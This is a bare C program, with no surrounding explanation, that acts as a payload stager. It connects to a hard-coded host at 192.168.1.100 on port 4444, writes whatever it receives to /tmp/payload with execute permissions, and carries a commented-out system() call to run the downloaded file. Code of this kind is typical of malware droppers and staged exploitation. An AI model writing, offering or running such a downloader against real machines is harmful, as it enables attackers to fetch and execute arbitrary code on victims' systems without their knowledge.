#include <unistd.h>
#include <arpa/inet.h>
#include <sys/socket.h>
#include <fcntl.h>

int main() {
    int sockfd = socket(AF_INET, SOCK_STREAM, 0);
    struct sockaddr_in addr = {0};
    addr.sin_family = AF_INET;
    addr.sin_port = htons(4444);
    addr.sin_addr.s_addr = inet_addr("192.168.1.100");
    connect(sockfd, (struct sockaddr *)&addr, sizeof(addr));

    char buf[1024];
    int fd = open("/tmp/payload", O_CREAT | O_WRONLY, 0700);
    ssize_t n;
    while ((n = recv(sockfd, buf, sizeof(buf), 0)) > 0) {
        write(fd, buf, n);
    }
    close(fd);
    // optionally execute: system("/tmp/payload");
    close(sockfd);
    return 0;
}
